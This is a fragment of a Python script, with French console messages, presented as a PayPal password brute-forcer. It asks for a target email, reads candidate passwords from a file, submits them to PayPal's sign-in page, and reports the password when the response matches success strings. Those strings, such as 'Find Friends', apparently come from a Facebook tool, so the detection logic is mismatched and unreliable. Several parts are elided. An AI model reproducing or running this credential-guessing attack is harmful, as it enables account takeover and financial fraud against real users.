...
--------------------------------------
                        ''')
        sys.exit()
post_url='https://www.paypal.com/signin'
headers = {
...
print('\n########-----BIENVENUE SUR PAYPAL BRUTE FORCE----##########\n')
file=open('passwords.txt','r')

email=str(raw_input('Enter Email/Username : ').strip())

print ("\nentrer l'email de la cible: ",email)
print ("\nessai de mot de passe vueillez patientez...")
	...
	try:
		if response.code == 200:
			...
			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
				print('le mot de passe est: ',passw)
				break
	except:
